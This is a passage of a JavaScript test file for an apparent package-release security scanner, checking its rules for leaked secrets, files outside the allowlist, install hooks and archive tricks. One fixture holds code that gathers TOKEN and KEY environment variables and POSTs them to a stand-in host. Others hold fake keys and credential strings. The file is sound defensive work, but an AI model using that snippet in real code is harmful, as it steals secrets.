        "deploy/app.conf",
      ],
      ["Discord bot token in YAML", () => `token: ${fakeDiscord.join(".")}\n`, "config/bot.yml"],
      [
        "AWS key id after a \\n escape",
        () => `const creds = "[default]\\n${fakeAwsKeyId.join("")}\\n";\n`,
        "lib/client.js",
      ],
      [
        "AWS key id in a SigV4 credential scope",
        () =>
          `const url = "https://bucket.example.invalid/o?X-Amz-Credential=${fakeAwsKeyId.join("")}/20240101/us-east-1/s3/aws4_request";\n`,
        "lib/client.js",
      ],
      [
        "CamelCase password with a trailing year",
        () => '  password: "AcmeCorp2024",\n',
        "lib/client.js",
      ],
    ])("flags a %s", (_shape, sample, path) => {
      expect(secretFindings(sample(), path)).toHaveLength(1);
    });

    test.each([
      ['const X_AWS_EC2_METADATA_TOKEN = "x-aws-ec2-metadata-token";\n'],
      ["    password = url44.password\n"],
      ["    const token = exports$1.HEX_TOKEN_VALUE\n"],
    ])("keeps %j a name or property path", (textSample) => {
      expect(secretFindings(textSample)).toEqual([]);
    });
  });

  test("requires self-identifying tokens and key bodies to stand alone", () => {
    const secretFindings = (textSample, path = "lib/index.js") => {
      const staged = [{ path, size: textSample.length, sha256: path, flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "file.secret-content",
      );
    };
    const fakeKeyBody = "MIIEowIBAAKCAQEAfakefixturefakefixturefakefixturefakefixture00";

    // A 20-char AKIA window inside an inlined WASM module's base64 is chance.
    expect(
      secretFindings(
        'const wasm = "AAAABzAAAAAAAAAKEAAAB0AAAAAAAAAKIAAAB0AAAAAAAAAKMAAAB1AAAA";\n',
      ),
    ).toEqual([]);
    expect(secretFindings("aws_access_key_id = AKIAQ7XK2M9PLR4T8VB3\n")).toHaveLength(1);

    expect(secretFindings("// https://hooks.slack.com/services/xxx/xxx/xxx\n")).toEqual([]);
    // Assembled at runtime so push protection does not read the fixture as a live webhook.
    const slackHookFixture = [
      "https://hooks.slack.com/services",
      "T0FAKE123",
      "B0FAKE456",
      "fakefixture0000000000000",
    ].join("/");
    expect(secretFindings(`const hook = "${slackHookFixture}";\n`)).toHaveLength(1);

    expect(
      secretFindings(
        ' * key="-----BEGIN PRIVATE KEY-----\\nXXXX\\nXXXX\\n-----END PRIVATE KEY-----"\n' +
          ' * privateKey: "-----BEGIN PRIVATE KEY-----<KEY>-----END PRIVATE KEY-----\\n"\n',
      ),
    ).toEqual([]);
    expect(
      secretFindings(
        "result.push('-----BEGIN PGP PRIVATE KEY BLOCK-----\\n');\n" +
          "result.push(addheader(customComment, config));\n" +
          "result.push(base64.encode(body));\n" +
          "result.push('-----END PGP PRIVATE KEY BLOCK-----\\n');\n",
      ),
    ).toEqual([]);
    expect(
      secretFindings(
        `-----BEGIN RSA PRIVATE KEY-----\n${fakeKeyBody}\n-----END RSA PRIVATE KEY-----\n`,
        "certs/server.key",
      ),
    ).toHaveLength(1);
    expect(
      secretFindings(
        `const key = "-----BEGIN PRIVATE KEY-----\\n${fakeKeyBody}\\n-----END PRIVATE KEY-----\\n";\n`,
      ),
    ).toHaveLength(1);
  });

  test("does not read minified string seams or placeholder logins as URL credentials", () => {
    const secretFindings = (textSample, path = "lib/index.js") => {
      const staged = [{ path, size: textSample.length, sha256: path, flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "file.secret-content",
      );
    };

    expect(
      secretFindings(
        'homepage:"https://dotenvx.example",keywords:["dotenv","env"],author:"dev@example.invalid"\n',
      ),
    ).toEqual([]);
    expect(secretFindings("npm config set proxy http://[user:pwd]@domain.tld:port\n")).toEqual([]);
    expect(secretFindings('return "postgresql://login:password@localhost:5432/db";\n')).toEqual([]);
    expect(
      secretFindings('return "mongodb+srv://root:randompassword@cluster0.example.invalid/db";\n'),
    ).toEqual([]);
    expect(secretFindings('url: "redis://alice:foobared@cache.example.invalid:6380",\n')).toEqual(
      [],
    );
    expect(
      secretFindings('const dsn = "postgres://svc:9f8a7b6c5d4e@10.0.0.5/prod";\n'),
    ).toHaveLength(1);
  });

  test("scans adversarial markup and env whitespace in linear time", () => {
    const run = (path, textSample) => {
      const staged = [{ path, size: textSample.length, sha256: path, flags: [], textSample }];
      const started = performance.now();
      deterministicFindings(staged, createPackageDiff([], staged));
      return performance.now() - started;
    };

    expect(run("site/index.html", "<script>".repeat(64 * 1024))).toBeLessThan(2000);
    expect(run("site/handlers.html", '<a onclick="'.repeat(40 * 1024))).toBeLessThan(2000);
    expect(run("index.js", `process.env${"\n".repeat(128 * 1024)}`)).toBeLessThan(2000);
    expect(run("lib/destructure.js", "} = process.env\n".repeat(20 * 1024))).toBeLessThan(2000);
    expect(run("lib/braces.js", `${"{ a, ".repeat(40 * 1024)}} = process.env`)).toBeLessThan(2000);
    expect(run("lib/aliases.js", "const e = process.env;\n".repeat(16 * 1024))).toBeLessThan(2000);
    expect(
      run("lib/alias-uses.js", `const e = process.env;\n${"e.PORT;".repeat(32 * 1024)}`),
    ).toBeLessThan(2000);
    expect(
      run("lib/guards.js", `${"!".repeat(64 * 1024)}process.env${" ".repeat(64 * 1024)}`),
    ).toBeLessThan(2000);
    expect(run("site/attrs.html", `<p x=${" ".repeat(128 * 1024)}y>`)).toBeLessThan(2000);
    expect(run("site/refs.html", `<a href="${"&#x".repeat(40 * 1024)}`)).toBeLessThan(2000);
    expect(run("lib/conn.js", "Host=".repeat(40 * 1024))).toBeLessThan(2000);
  }, 60_000);

  test("does not flag placeholder URL credentials as secret content", () => {
    // requests' HISTORY.md CVE-2023-32681 entry (`http://user:pass@proxy`) is
    // the canonical benign hit: doc-style placeholder passwords are not leaks.
    const staged = [
      {
        path: "HISTORY.md",
        size: 160,
        sha256: "history",
        flags: [],
        textSample:
          "When proxies are defined with user info (`http://user:pass@proxy.example`),\n" +
          "a Proxy-Authorization header is constructed.\n",
      },
      {
        path: "lib/config.js",
        size: 120,
        sha256: "config",
        flags: [],
        textSample: 'const proxyExample = "https://user:<password>@registry.example.com";\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("still flags URL credentials with a real-looking password", () => {
    // Weak-word passwords stay findings when the username is not itself a
    // placeholder: `svc:secret@db` is a real (if weak) connection-string
    // credential, unlike doc-style `user:pass@proxy`.
    const staged = [
      {
        path: "lib/config.js",
        size: 120,
        sha256: "config-real",
        flags: [],
        textSample: 'const upstream = "https://deploy:9f8a7b6c5d4e3f2a1b@registry.example.com";\n',
      },
      {
        path: "lib/db.js",
        size: 120,
        sha256: "config-weak",
        flags: [],
        textSample: 'const dsn = "postgres://svc:secret@10.0.0.5:5432/prod";\n',
      },
      {
        path: "lib/admin.js",
        size: 120,
        sha256: "config-admin",
        flags: [],
        textSample: 'const admin = "mysql://root:admin@db.internal:3306/app";\n',
      },
      {
        path: "lib/default-admin.js",
        size: 120,
        sha256: "config-default-admin",
        flags: [],
        textSample: 'const admin = "mysql://admin:admin@db.internal:3306/app";\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const secretFiles = new Set(
      findings.filter((finding) => finding.ruleId === "file.secret-content").map((f) => f.file),
    );

    expect(secretFiles.has("lib/config.js")).toBe(true);
    expect(secretFiles.has("lib/db.js")).toBe(true);
    expect(secretFiles.has("lib/admin.js")).toBe(true);
    expect(secretFiles.has("lib/default-admin.js")).toBe(true);
  });

  test("does not scan Python packaging metadata prose as capability evidence", () => {
    // PKG-INFO / .dist-info/METADATA embed the README long-description, so
    // capability regexes over them only re-flag documentation examples.
    const prose =
      "Metadata-Version: 2.3\nName: demo\nVersion: 1.0.0\n\nUsage:\n\n" +
      '    requests.get("https://api.example.invalid/status")\n\n' +
      "Reads proxy auth from os.environ or a .netrc file.\n";
    const staged = [
      { path: "sdist/PKG-INFO", size: 200, sha256: "pkginfo", flags: [], textSample: prose },
      {
        path: "sdist/src/.egg-info/PKG-INFO",
        size: 200,
        sha256: "egg",
        flags: [],
        textSample: prose,
      },
      {
        path: "wheel/py3-none-any/.dist-info/METADATA",
        size: 200,
        sha256: "meta",
        flags: [],
        textSample: prose,
      },
      {
        path: "wheel/py3-none-any/demo/client.py",
        size: 160,
        sha256: "client",
        flags: [],
        textSample:
          "import os\nimport requests\n\n\ndef send():\n" +
          '    return requests.get("https://api.example.invalid", params={"k": os.environ.get("D")})\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });
    const codeFindingFiles = new Set(
      findings.filter((finding) => finding.ruleId?.startsWith("code.")).map((f) => f.file),
    );

    expect(codeFindingFiles.has("sdist/PKG-INFO")).toBe(false);
    expect(codeFindingFiles.has("sdist/src/.egg-info/PKG-INFO")).toBe(false);
    expect(codeFindingFiles.has("wheel/py3-none-any/.dist-info/METADATA")).toBe(false);
    // Real package code with the same capabilities still flags.
    expect(codeFindingFiles.has("wheel/py3-none-any/demo/client.py")).toBe(true);
  });

  test("demotes longstanding secret-looking content in unreachable test files", () => {
    const key = {
      path: "test/fixtures/server.key",
      size: 160,
      sha256: "test-key",
      flags: [],
      textSample:
        "-----BEGIN PRIVATE KEY-----\nTESTFIXTUREONLYTESTFIXTUREONLYTESTFIXTUREONLY\n-----END PRIVATE KEY-----\n",
    };
    const findings = deterministicFindings([key], createPackageDiff([key], [key]));

    expect(findings).toContainEqual(
      expect.objectContaining({
        ruleId: "file.secret-content",
        file: "test/fixtures/server.key",
        // Unchanged files flag high; the test-scope demotion steps it to medium.
        severity: "medium",
        testScoped: true,
        evidence: expect.stringContaining("test-scoped"),
      }),
    );
  });

  test("keeps full severity for a secret newly added to a test tree", () => {
    // A secret entering a test tree is a fresh leak (or fresh payload staging),
    // not longstanding fixture material — the test-scope demotion must not apply.
    const staged = [
      {
        path: "test/fixtures/server.key",
        size: 160,
        sha256: "test-key",
        flags: [],
        textSample:
          "-----BEGIN PRIVATE KEY-----\nTESTFIXTUREONLYTESTFIXTUREONLYTESTFIXTUREONLY\n-----END PRIVATE KEY-----\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const secret = findings.find((finding) => finding.ruleId === "file.secret-content");

    expect(secret).toMatchObject({ severity: "critical", file: "test/fixtures/server.key" });
    expect(secret.testScoped).toBeUndefined();
  });

  test("keeps full severity for an unchanged Python test secret imported by package code", () => {
    const absoluteSecret = {
      path: "sdist/src/demo/tests/secrets.py",
      size: 80,
      sha256: "python-absolute-secret",
      flags: [],
      textSample: 'password = "fixture-s3cr3t-9f8a7b6c"\n',
    };
    const relativeSecret = {
      path: "sdist/src/demo/tests/relative_secrets.py",
      size: 80,
      sha256: "python-relative-secret",
      flags: [],
      textSample: 'password = "fixture-s3cr3t-1e2d3c4b"\n',
    };
    const app = {
      path: "sdist/src/demo/app.py",
      size: 80,
      sha256: "python-app",
      flags: [],
      textSample:
        "from demo.tests.secrets import password\n" +
        "from .tests.relative_secrets import password as relative_password\n",
    };
    const findings = deterministicFindings(
      [absoluteSecret, relativeSecret, app],
      createPackageDiff([absoluteSecret, relativeSecret], [absoluteSecret, relativeSecret, app]),
      null,
      { codePatternSet: "python" },
    );
    const secretFindings = findings.filter(
      (candidate) => candidate.ruleId === "file.secret-content",
    );

    expect(secretFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ severity: "high", file: absoluteSecret.path }),
        expect.objectContaining({ severity: "high", file: relativeSecret.path }),
      ]),
    );
    expect(secretFindings.every((finding) => finding.testScoped === undefined)).toBe(true);
  });

  test("does not flag secret-looking source map content", () => {
    // The tar parser strips text samples from .map files (shouldSkipTextSample),
    // so deterministic rules never see source-map contents.
    const staged = [
      {
        path: "core/index.js.map",
        size: 120,
        sha256: "map",
        flags: ["text-sample-skipped"],
      },
      {
        path: "config.js",
        size: 80,
        sha256: "secret",
        flags: [],
        textSample: "export const config = { password: 'abc!def@ghi#jkl' };\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(
      findings.some(
        (finding) =>
          finding.ruleId === "file.secret-content" && finding.file === "core/index.js.map",
      ),
    ).toBe(false);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "config.js",
        }),
      ]),
    );
  });

  test("does not treat importlib.metadata as Python dynamic evaluation", () => {
    const staged = [
      {
        path: "demo_package/_version.py",
        size: 90,
        sha256: "version",
        flags: [],
        textSample:
          'from importlib.metadata import version\n__version__ = version("demo-package")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("detects Python dynamic import execution", () => {
    const staged = [
      {
        path: "demo_package/loader.py",
        size: 90,
        sha256: "loader",
        flags: [],
        textSample: 'import importlib\nplugin = importlib.import_module("demo_package.plugin")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          file: "demo_package/loader.py",
        }),
      ]),
    );
  });

  test("flags files outside package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 72,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist", flags: [], textSample: "export {};" },
      {
        path: "router_init.js",
        size: 2048,
        sha256: "payload",
        flags: [],
        textSample: "console.log('init');",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "router_init.js",
        evidence: "new/changed added file: file is not matched by package.json files allowlist",
        ruleId: "file.outside-files-list",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("does not flag prepare as a consumer install lifecycle hook", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.1",
          scripts: { prepare: "husky && npm run test:install && run-s build" },
        }),
      },
    ];

    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle" }),
    );
  });

  test("discloses unreferenced documentation outside the files allowlist at low severity", () => {
    const manifest = { name: "pkg", version: "1.0.1", files: ["dist"] };
    const staged = [
      {
        path: "package.json",
        size: 72,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify(manifest),
      },
      { path: "dist/index.js", size: 20, sha256: "dist", flags: [], textSample: "export {};" },
      {
        path: "readme-template.md",
        size: 30,
        sha256: "template",
        flags: [],
        textSample: "# <%= name %>\n",
      },
      {
        path: "payload.md",
        size: 40,
        sha256: "payload",
        flags: [],
        textSample: "module.exports = 'javascript as a doc';\n",
      },
      {
        path: "scripts/load.js",
        size: 40,
        sha256: "loader",
        flags: [],
        textSample: "require('../payload.md');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged)).filter(
      (finding) => finding.ruleId === "file.outside-files-list",
    );

    expect(findings).toContainEqual(
      expect.objectContaining({ file: "readme-template.md", severity: "low" }),
    );
    // Named by shipped code, so it may run as code.
    expect(findings).toContainEqual(
      expect.objectContaining({ file: "payload.md", severity: "high" }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({ file: "scripts/load.js", severity: "high" }),
    );
  });

  test.each([
    [
      "a folded path join",
      "module.exports = require(path.join(__dirname, '..', 'docs', 'guide.' + 'md'));",
    ],
    [
      "an array join",
      "const name = ['gui', 'de.m', 'd'].join('');\nmodule.exports = require('../docs/' + name);",
    ],
    [
      "a registered loader",
      "require.extensions['.md'] = require.extensions['.js'];\nmodule.exports = require('../docs/gu' + `ide`);",
    ],
    [
      "a template-literal path, through the doc's own content",
      "const target = `../docs/${n}.${ext}`;\nrequire(target);",
    ],
  ])(
    "keeps documentation outside the files allowlist high when code loads it via %s",
    (_, loader) => {
      const manifest = { name: "pkg", version: "1.0.1", files: ["dist"], main: "dist/index.js" };
      const file = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
      const staged = [
        file("package.json", JSON.stringify(manifest)),
        file("dist/index.js", loader),
        file(
          "docs/guide.md",
          "const t = Object.entries(process.env).filter(([k]) => /TOKEN|KEY/.test(k));\n" +
            "fetch('https://collector.example/c', { method: 'POST', body: JSON.stringify(t) });\n",
        ),
      ];
      const findings = deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "file.outside-files-list",
      );

      expect(findings).toEqual([
        expect.objectContaining({ file: "docs/guide.md", severity: "high" }),
      ]);
    },
  );

  test("keeps a capability-free doc high when shipped code registers a module loader", () => {
    const manifest = { name: "pkg", version: "1.0.1", files: ["dist"], main: "dist/index.js" };
    const file = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
    const staged = [
      file("package.json", JSON.stringify(manifest)),
      file("dist/index.js", "require.extensions['.md'] = require.extensions['.js'];"),
      file("docs/guide.md", "module.exports = 1;\n"),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged)).filter(
      (finding) => finding.ruleId === "file.outside-files-list",
    );

    expect(findings).toEqual([
      expect.objectContaining({ file: "docs/guide.md", severity: "high" }),
    ]);
  });

  test("matches glob entries in package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 77,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist/*.js"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist-js", flags: [], textSample: "export {};" },
      { path: "dist/style.css", size: 9, sha256: "dist-css", flags: [], textSample: "body {}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({ file: "dist/style.css", ruleId: "file.outside-files-list" }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("flags npm's implicit node-gyp install hook from root gyp files", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "binding.gyp",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
  });

  test("marks implicit node-gyp as release delta when package.json newly enables it", () => {
    const previous = [
      {
        path: "package.json",
        size: 70,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0", gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(diff.find((entry) => entry.path === "binding.gyp")?.status).toBe("unchanged");
    expect(annotated).toContainEqual(
      expect.objectContaining({
        file: "binding.gyp",
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: true,
      }),
    );
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });

  test("keeps pre-existing implicit node-gyp findings contextual when only package metadata changes", () => {
    const previous = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated).toContainEqual(
      expect.objectContaining({
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: false,
      }),
    );
  });

  test("does not flag implicit node-gyp when npm suppressors are present", () => {
    const withPreinstall = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node setup.js" } }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const withGypfileFalse = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];

    expect(
      deterministicFindings(withPreinstall, createPackageDiff([], withPreinstall)),
    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
    expect(
      deterministicFindings(withGypfileFalse, createPackageDiff([], withGypfileFalse)),
    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
  });

  test("warns instead of inferring implicit node-gyp when package.json cannot be parsed", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: "{not-json",
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "medium",
        file: "package.json",
        evidence: "package.json parse failed",
        ruleId: "package-json.parse-failed",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }),
    );
  });

  test("keeps tar directory entries informational", () => {
    const findings = tarSuspiciousEntryFindings([
      {
        kind: "non-regular",
        path: "<unknown>",
        detail: "typeflag 5 (directory)",
      },
      {
        kind: "non-regular",
        path: "link",
        detail: "typeflag 2 (symlink)",
      },
    ]);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "info",
        evidence: "non-regular: typeflag 5 (directory)",
        ruleId: "tar.suspicious-entry",
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        evidence: "non-regular: typeflag 2 (symlink)",
        ruleId: "tar.suspicious-entry",
      }),
    );
  });

  test("raises entries hidden behind a lone end-of-archive block as high", () => {
    const entries = [
      {
        kind: "parser-differential",
        path: "<archive>",
        detail: "1 entry follows an all-zero block",
      },
    ];
    const npm = tarSuspiciousEntryFindings(entries);
    const pypi = tarSuspiciousEntryFindings(entries, { dialect: "pypi" });

    expect(npm[0]).toEqual(
      expect.objectContaining({
        severity: "high",
        file: "<archive>",
        evidence: "parser-differential: 1 entry follows an all-zero block",
        ruleId: "tar.suspicious-entry",
      }),
    );
    expect(npm[0].reason).toContain("the reader `npm install` extracts with");
    expect(pypi[0].reason).toContain("pip's CPython `tarfile`");
    expect(computeRisk(npm)).toBe("high");
  });

  test("explains zip-reader disclosures in zip terms under either dialect", () => {
    const entries = [
      {
        kind: "parser-differential",
        archive: "zip",
        path: "pkg/../hook.pth",
        detail: "entry path is not representable as a safe relative path",
      },
    ];

    for (const dialect of ["npm", "pypi"]) {
      const [finding] = tarSuspiciousEntryFindings(entries, { dialect });
      expect(finding).toEqual(
        expect.objectContaining({
          severity: "high",
          file: "pkg/../hook.pth",
          ruleId: "tar.suspicious-entry",
        }),
      );
      expect(finding.reason).toContain("Zip extractors disagree");
      expect(finding.reason).not.toMatch(/node-tar|npm install|tarfile/);
    }
  });

  test("escalates retention-tier findings when hash-only content changed", () => {
    const entries = [
      {
        kind: "retention-tier",
        path: "<archive>",
        detail: "one file body was recorded hash-only",
      },
    ];
    const unchanged = tarSuspiciousEntryFindings(entries, {
      fileDiff: [{ status: "unchanged", flags: ["content-skipped"] }],
    });
    const changed = tarSuspiciousEntryFindings(entries, {
      fileDiff: [{ status: "modified", flags: ["content-skipped"] }],
    });

    expect(unchanged[0].severity).toBe("info");
    expect(changed[0].severity).toBe("medium");
    expect(computeRisk(changed)).toBe("medium");
  });

  test("keeps the retention-tier notice informational when only never-sampled bodies changed", () => {
    const entries = [
      {
        kind: "retention-tier",
        path: "<archive>",
        detail: "6 file bodies were recorded hash-only",
      },
    ];
    const findings = tarSuspiciousEntryFindings(entries, {
      fileDiff: [
        {
          path: "build/engine.wasm",
          status: "modified",
          flags: ["content-skipped", "native-wasm"],
        },
        {
          path: "prebuilds/win32-x64.node",
          status: "added",
          flags: ["content-skipped", "native-pe"],
        },
        { path: "runtime/client.js.map", status: "modified", flags: ["content-skipped"] },
        { path: "dist/bundle.min.js", status: "modified", flags: ["content-skipped"] },
      ],
    });

    expect(findings).toEqual([
      expect.objectContaining({ ruleId: "tar.suspicious-entry", severity: "info" }),
    ]);
  });

  test("escalates the retention-tier notice when a never-sampled bundle is what runs", () => {
    const entries = [
      {
        kind: "retention-tier",
        path: "<archive>",
        detail: "2 file bodies were recorded hash-only",
      },
    ];
    const changedBundle = [
      { path: "dist/app.min.js", status: "modified", flags: ["content-skipped"] },
      { path: "dist/app.min.js.map", status: "modified", flags: ["content-skipped"] },
    ];
    const severity = (stagedFiles) =>
      tarSuspiciousEntryFindings(entries, { fileDiff: changedBundle, stagedFiles })[0].severity;
    const hashOnly = changedBundle.map(({ path, flags }) => ({ path, flags }));
    const sampled = (path, textSample) => ({ path, flags: [], textSample });

    expect(severity([...hashOnly, sampled("package.json", '{"main":"./dist/app.min.js"}')])).toBe(
      "medium",
    );
    expect(
      severity([
        ...hashOnly,
        sampled("package.json", '{"exports":{".":{"require":"./dist/app.min.js"}}}'),
      ]),
    ).toBe("medium");
    expect(
      severity([
        ...hashOnly,
        sampled("package.json", '{"main":"index.js"}'),
        sampled("index.js", "module.exports = require(path.join(__dirname, 'dist', 'app.min'));"),
      ]),
    ).toBe("medium");
    expect(
      severity([
        ...hashOnly,
        sampled("package.json", '{"main":"index.js"}'),
        sampled("index.js", "module.exports = 1;\n//# sourceMappingURL=app.min.js.map"),
      ]),
    ).toBe("info");
  });

  test("finds a never-sampled bundle named among millions of distinct tokens", async () => {
    // Indexing every token outgrows an 80 MB heap.
    await expect(runUnderHeapLimit("neverSampledBundle", 80)).resolves.toBe("info");
    const tokens = distinctTokenText(100_000);
    expect(neverSampledBundleSeverity(tokens)).toBe("info");
    expect(neverSampledBundleSeverity(`${tokens} require('./dist/APP.MIN')`)).toBe("medium");
  }, 60_000);

  test("escalates the retention-tier notice when an uninspected text tail file changed beside binaries", () => {
    const entries = [
      {
        kind: "retention-tier",
        path: "<archive>",
        detail: "2 file bodies were recorded hash-only",
      },
    ];
    const findings = tarSuspiciousEntryFindings(entries, {
      fileDiff: [
        {
          path: "build/engine.wasm",
          status: "modified",
          flags: ["content-skipped", "native-wasm"],
        },
        { path: "dist/zz-tail.js", status: "modified", flags: ["content-skipped"] },
      ],
    });

    expect(findings[0].severity).toBe("medium");
  });

  test("judges the retention-tier gap by the reviewed side's record, not the union of both sides", () => {
    const entries = [
      { kind: "retention-tier", path: "<archive>", detail: "1 file body was recorded hash-only" },
    ];
    // The baseline stored dist/index.js hash-only; this release inspected it in full.
    const fileDiff = [{ path: "dist/index.js", status: "modified", flags: ["content-skipped"] }];
    const inspected = tarSuspiciousEntryFindings(entries, {
      fileDiff,
      stagedFiles: [{ path: "dist/index.js", flags: [] }],
    });
    const uninspected = tarSuspiciousEntryFindings(entries, {
      fileDiff,
      stagedFiles: [{ path: "dist/index.js", flags: ["content-skipped"] }],
    });

    expect(inspected[0].severity).toBe("info");
    expect(uninspected[0].severity).toBe("medium");
  });

  test("uses staged metadata to flag implicit node-gyp even when the gyp file is absent from the tarball", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), {
      name: "pkg",
      version: "1.0.1",
      scripts: { install: "node-gyp rebuild" },
      implicitScripts: { install: "node-gyp rebuild" },
      gypfile: true,
    });

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle" }),
    );
  });
});
